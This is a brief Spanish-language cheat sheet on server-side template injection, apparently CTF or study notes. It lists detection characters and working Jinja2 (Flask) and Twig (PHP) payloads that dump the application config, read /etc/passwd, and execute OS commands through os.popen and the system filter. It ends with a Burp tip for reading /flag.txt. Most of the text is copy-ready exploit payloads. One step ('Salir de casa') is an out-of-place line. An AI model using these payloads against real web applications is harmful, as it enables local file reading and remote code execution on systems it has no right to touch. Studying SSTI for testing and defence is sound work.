
Server-Side template injection -> Cuando un template engine como jinja acepta input antes de que la función de renderizado se active, permitiendo que el atacante inyecte código y que este sea renderizado
## Identifying SSTI

1. Meterle carácteres usados comunmente en los template para ver si salta error : ```${{<%[%'"}}%\.``` -> carácteres más comunes

2. Identificar el Template Engine

 <img width="1065" height="690" alt="image" src="https://github.com/user-attachments/assets/6f7c0f12-afb2-4abe-b7b8-e7f7301866a3" />


3. Salir de casa

## Explotation - Jinja2

Usado en python web frameworks como `Flask` o `Django` - nos centraremos en Flask

1. Payload para ver la configuración de la aplicación web
```jinja2
{{ config.items() }}
```
2. Payload que dumpea todas las funciones built-in 
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```
3. Si la funciones open está activa podemos hacer LFI de la siguiente forma
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
4. RCE,  necesitamos la librería 'os' , si no está instalada tendremos que hacerle import desde el payload 
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Explotation - Twig

Basado en PHP

1. Payload para que nos de info sobre el template
```twig
{{ _self }}
```
2. LFI (si usa Symfony)
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
3. RCE
```twig
{{['id']|filter('system')}}
```

si quieres hacer cat /flag.txt con burp el espacio ponlo como `\x20`
